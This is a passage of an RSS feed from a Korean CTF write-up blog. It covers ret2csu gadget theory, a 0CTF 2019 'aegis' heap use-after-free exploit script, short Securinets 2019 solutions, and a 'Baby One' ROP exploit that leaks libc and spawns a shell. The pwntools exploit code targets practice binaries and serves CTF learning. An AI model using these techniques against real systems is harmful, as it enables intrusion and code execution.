class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006B</span>6 loc_4006B6:</span><br><span class="line">.text:<span class="number">00000000004006B</span>6 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004006B</span>A pop     rbx</span><br><span class="line">.text:<span class="number">00000000004006B</span>B pop     rbp</span><br><span class="line">.text:<span class="number">00000000004006B</span>C pop     r12</span><br><span class="line">.text:<span class="number">00000000004006B</span>E pop     r13</span><br><span class="line">.text:<span class="number">00000000004006</span>C0 pop     r14</span><br><span class="line">.text:<span class="number">00000000004006</span>C2 pop     r15</span><br><span class="line">.text:<span class="number">00000000004006</span>C4 retn</span><br><span class="line">.text:<span class="number">00000000004006</span>C4 ; &#125; <span class="comment">// starts at 400660</span></span><br><span class="line">.text:<span class="number">00000000004006</span>C4 __libc_csu_ini</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init gadget1]</small></center>여기서 우리가 조작할 수 있는 주소는 rbx, rbp, r12, r13, r14, r15 이다.  첫번째, 두번째 인자값을 받는 rdi, rsi가 없는데 어떻게 할 수 있을까란 생각이 들 수 있겠지만 그 부분은 바로 아래의 코드를 확인하면 알 수 있을 것이다. <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006</span>A0 loc_4006A0:</span><br><span class="line">.text:<span class="number">00000000004006</span>A0 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004006</span>A3 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004006</span>A6 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004006</span>A9 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000000004006</span>AD add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004006B</span>1 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004006B</span>4 jnz     <span class="keyword">short</span> loc_4006A0</span><br></pre></td></tr></table></figure><center><small>[libc_csu_init gadget2]</small></center><p>[gadget1] 코드에서 pop 해줬던 r15,r14,r13 값을 다시 edi,rsi,rdx에 셋팅한다.(보다시피 rdi가 아닌 edi라서 edi 값은 32비트 범위의 한해서만 조작이 가능하다.)<br>그리고는 <strong>r12+rbx*8</strong>한 값을 호출하는데 rbx 값을 0으로 셋팅해준다면 <strong>0[rbx] * 8</strong>이 돼서 최종적으로 r12의 값만 호출할 수 있게끔 한다.<br>rbx의 값에 1을 더하고 rbp값과 비교연산을 거친다. rbx값을 1로 셋팅해준다면 조건분기문도 성립되어 문제 없이 통과하게 된다.</p><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/04/01/rtc_theory/#disqus_thread</comments>
    </item>
    
    <item>
      <title>0CTF CTF 2019 aegis (Incompletion)</title>
      <link>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/</link>
      <guid>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/</guid>
      <pubDate>Tue, 26 Mar 2019 01:45:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;aegis&quot;&gt;&lt;a class=&quot;markdownIt-Ancho
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="aegis"><a class="markdownIt-Anchor" href="#aegis"></a> aegis</h2><p><a href="/j0n9hyun.github.io/upload/aegis">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036090-3c97b780-7b65-11e9-8554-7350b7a0f423.PNG"><center><small>[Mitigation]</small></center>잘 안 보이는 보호기법이 추가되었다. (대회에서 나온 거 처음 봄) <br> <br>  <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036091-3dc8e480-7b65-11e9-9465-a19934888c08.PNG"><center><small>[In IDA]</small></center>IDA를 통해서 열어보면 ASAN, UBSAN 보호기법의 영향으로 마치 libc 파일을 여는 듯이 불러오는 함수가 많다. (보기 싫어진다) <br> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036135-5a651c80-7b65-11e9-9ae8-7a2c1f7ccec1.PNG"><center><small>[main.c]</small></center>여느 힙 문제와 같이 메뉴들이 주어졌는데 하단에 보면 히든 메뉴가 있다. <br><br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036136-5a651c80-7b65-11e9-9aa9-e802bbd6a61d.PNG"><center><small>[굉장히 보기 싫게 생긴 코드]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58036134-59cc8600-7b65-11e9-9391-584f6eda43d2.PNG"><center><small>[delete menu]</small></center>이 부분에서 UAF가 발생한다. <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./aegis'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size, content, ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content: "</span>, str(content))</span><br><span class="line">    p.sendlineafter(<span class="string">"ID: "</span>, str(ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Content: "</span>, str(p.recvline))</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_note_sendline</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_note</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(addr)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"666"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Lucky Number: "</span>, str(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>, <span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_asan</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((addr &gt;&gt; <span class="number">3</span>) + <span class="number">0x7fff8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_word</span><span class="params">()</span>:</span></span><br><span class="line">    note_data = show_note(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"note data"</span>, note_data</span><br><span class="line">    note_data = note_data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    note_data = (u64(note_data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)))</span><br><span class="line">    <span class="keyword">return</span> note_data</span><br><span class="line"></span><br><span class="line">VAL = <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">add_note(<span class="number">16</span>, <span class="string">"a"</span>*<span class="number">8</span>, VAL)</span><br><span class="line">add_note(<span class="number">16</span>, <span class="string">"b"</span>*<span class="number">8</span>, VAL)</span><br><span class="line">addr = to_asan(<span class="number">0x602000000020</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"magiccc"</span>, hex(addr)</span><br><span class="line">secret(addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do 1st update</span></span><br><span class="line">update_note(<span class="number">0</span>, <span class="string">'C'</span>*<span class="number">18</span>, <span class="number">0xffff</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do 2nd update</span></span><br><span class="line">payload  = <span class="string">'d'</span>*<span class="number">16</span> + <span class="string">'\x02'</span>*<span class="number">3</span></span><br><span class="line">payloadid = <span class="number">0xffffffff02ffffff</span></span><br><span class="line">update_note_sendline(<span class="number">0</span>, payload, payloadid)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">add_note(<span class="number">16</span>, p64(<span class="number">0x602000000018</span>), <span class="number">0x00</span>)</span><br><span class="line">note_data = leak_word()</span><br><span class="line">cfi = note_data</span><br><span class="line">text_base = note_data - <span class="number">1133232</span></span><br><span class="line">log.progress(<span class="string">"Text base: &#123;&#125;"</span>.format((hex(text_base))))</span><br><span class="line"></span><br><span class="line">got_offset = <span class="number">0x000000000347E28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arb_read</span><span class="params">(addr)</span>:</span></span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">1</span>)+<span class="string">"\n"</span>, VAL)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">2</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">4</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">6</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">8</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, p64(addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">"\n"</span>, cfi)</span><br><span class="line"></span><br><span class="line">    note_data = leak_word()</span><br><span class="line">    <span class="keyword">return</span> note_data</span><br><span class="line"></span><br><span class="line">libc = arb_read(got_offset + text_base)</span><br><span class="line"></span><br><span class="line">libc -= <span class="number">526784</span></span><br><span class="line">log.progress(<span class="string">"LIBC: &#123;&#125;"</span>.format(hex(libc)))</span><br><span class="line">one_gadget = libc + <span class="number">0x10a38c</span>+<span class="number">12</span></span><br><span class="line">log.progress(<span class="string">"ONE GADGET: &#123;&#125;"</span>.format(hex(one_gadget)))</span><br><span class="line"></span><br><span class="line">malloc_hook_offset = <span class="number">0x00000000003ebc30</span></span><br><span class="line">main_arena_offset = <span class="number">4111424</span></span><br><span class="line">asan_malloc_hook_offset = <span class="number">0x7ae140</span></span><br><span class="line">san_userdie_callback = <span class="number">0xFB0888</span></span><br><span class="line">strtoul_got_offset = <span class="number">0x347f20</span></span><br><span class="line">environ_offset = <span class="number">4120728</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># intercepted methods</span></span><br><span class="line">real_vprintf_off = <span class="number">0x55BBB0</span></span><br><span class="line">real_memset_off = <span class="number">0x55Bd30</span></span><br><span class="line">real_cxa_atexit = <span class="number">0x559208</span></span><br><span class="line"></span><br><span class="line">update_func = text_base + <span class="number">0x114614</span></span><br><span class="line">main_func = text_base + <span class="number">0x114990</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># perform overwrite!</span></span><br><span class="line">overwrite_addr = text_base + san_userdie_callback + <span class="number">0x18</span> </span><br><span class="line">pop_rdx_rcx_rbx_ret = <span class="number">0x0000000000103cc9</span> </span><br><span class="line">ret = <span class="number">0x0000000000b17c5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arb_write</span><span class="params">(addr, val, idval = <span class="number">0</span>, use_cfi = True)</span>:</span></span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">1</span>)+<span class="string">"\n"</span>, VAL)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">2</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">4</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">6</span>), <span class="number">0xffff</span>)</span><br><span class="line">    update_note(<span class="number">2</span>, <span class="string">"c"</span>*(<span class="number">8</span>), <span class="number">0xffff</span>)</span><br><span class="line">    mycfi = cfi <span class="keyword">if</span> use_cfi <span class="keyword">else</span> <span class="number">0</span> </span><br><span class="line">    update_note(<span class="number">2</span>, p64(addr)[<span class="number">0</span>:<span class="number">6</span>] + <span class="string">"\n"</span>, one_gadget &lt;&lt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"idval"</span>, hex(idval)</span><br><span class="line">    update_note(<span class="number">0</span>, p64(val)[<span class="number">0</span>:<span class="number">6</span>] + <span class="string">"\n"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_trunc</span><span class="params">(index, new_content, new_ID)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"New Content: "</span>, str(new_content))</span><br><span class="line">    p.sendlineafter(<span class="string">"New ID: "</span>, str(new_ID))</span><br><span class="line"></span><br><span class="line">rop_gadget = libc + <span class="number">0x9df05</span></span><br><span class="line">arb_write(overwrite_addr, rop_gadget, idval=libc + ret, use_cfi = <span class="literal">False</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/26/0ctf_aegis/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 EZ</title>
      <link>http://j0n9hyun.github.io/2019/03/25/EZ/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/EZ/</guid>
      <pubDate>Mon, 25 Mar 2019 07:27:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;ez&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; 
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="ez"><a class="markdownIt-Anchor" href="#ez"></a> EZ</h2><p><a href="#" class="btn_success">File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034097-bda08000-7b60-11e9-80b3-5a9c06483d2b.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034098-bda08000-7b60-11e9-9289-c9c21922caf7.PNG"><center><small>[Steganography Decoding]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034100-bda08000-7b60-11e9-9c8d-9b239b667f3e.PNG"><center><small>[Hidden.txt]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034101-bda08000-7b60-11e9-99da-ae3cbfcdd87e.PNG"><center><small>[Googling]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58034096-bd07e980-7b60-11e9-8b05-dd7b66865c84.PNG"><center><small>[SHA-1 Encoding]</small></center> <br><blockquote><p>flag is <strong>Securinets{b47f0d2a8866a75696f94a515d0cdf54c7ea3174}</strong></p></blockquote><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/EZ/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 HIDDEN</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/</guid>
      <pubDate>Mon, 25 Mar 2019 06:41:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;hidden&quot;&gt;&lt;a class=&quot;markdownIt-Anch
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="hidden"><a class="markdownIt-Anchor" href="#hidden"></a> HIDDEN</h2><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033845-36530c80-7b60-11e9-903a-a6f0731646c8.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033942-6c908c00-7b60-11e9-9858-264ee597dccc.PNG"><center><small>[Web Page]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58033943-6d292280-7b60-11e9-80d0-de53fe56db7f.PNG"><center><small>[Get FLAG]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinets_hidden/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Easy Trade</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/</guid>
      <pubDate>Mon, 25 Mar 2019 06:25:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;easy-trade&quot;&gt;&lt;a class=&quot;markdownIt-
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="easy-trade"><a class="markdownIt-Anchor" href="#easy-trade"></a> Easy Trade</h2><p><a href="/j0n9hyun.github.io/upload/foren_trade.pcap">Pcap File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142272-63e3a700-7c81-11e9-8273-32ead6cf99dc.PNG"><center><small>[Problem]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142341-9a212680-7c81-11e9-9c5d-a6f8a16c1f54.PNG"><center><small>[Pcap File 1-1]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142298-7e1d8500-7c81-11e9-801d-726eab453f24.PNG"><center><small>[Pacp File 1-2]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142357-a86f4280-7c81-11e9-8df0-b6dbad39dfef.PNG"><center><small>[4444 Port Packet]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142358-a907d900-7c81-11e9-9155-1df8e62a1174.PNG"><center><small>[Hxd]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142360-aa390600-7c81-11e9-8a98-fb13439c5970.PNG"><center><small>[flag.zip]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142374-bc1aa900-7c81-11e9-88da-cd4407169148.PNG"><center><small>[Zip Password]</small></center> <br><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142376-bcb33f80-7c81-11e9-8ae3-0f44f710bc45.PNG"><center><small>[Base64 Decoding]</small></center> <br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  }</style>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/03/25/securinet_easy_trade/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Securinets Prequals CTF 2019 Baby One</title>
      <link>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/</link>
      <guid>http://j0n9hyun.github.io/2019/03/25/securinet_baby1/</guid>
      <pubDate>Mon, 25 Mar 2019 05:22:00 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h2 id=&quot;baby-one&quot;&gt;&lt;a class=&quot;markdownIt-An
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="baby-one"><a class="markdownIt-Anchor" href="#baby-one"></a> Baby One</h2><p><a href="/j0n9hyun.github.io/upload/baby1">Binary File</a></p><img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58142220-3139ae80-7c81-11e9-8c61-51c92a4bdc41.PNG"><center><small>[Problem]</small></center> <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">r = process(<span class="string">'./baby1'</span>)</span><br><span class="line"><span class="comment">#r = remote('51.254.114.246', 1111)</span></span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x4006c3</span></span><br><span class="line">csu_init1 = <span class="number">0x4006B6</span></span><br><span class="line">csu_init2 = <span class="number">0x4006A0</span></span><br><span class="line">main_addr = e.symbols[<span class="string">'main'</span>]</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">write_os = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_got = e.got[<span class="string">'read'</span>]</span><br><span class="line">system_os = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_os = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">libc_start = e.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(csu_init1)</span><br><span class="line">payload += <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(csu_init2)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">leaked = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leaked - write_os</span><br><span class="line">system_addr = libc_base + system_os</span><br><span class="line">binsh_addr = libc_base + binsh_os</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendlineafter(<span class="string">"\n"</span>, payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><small>[Exploit Code]</small></center><br><style>  img.border-shadow{      border:1px solid #888888;      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);  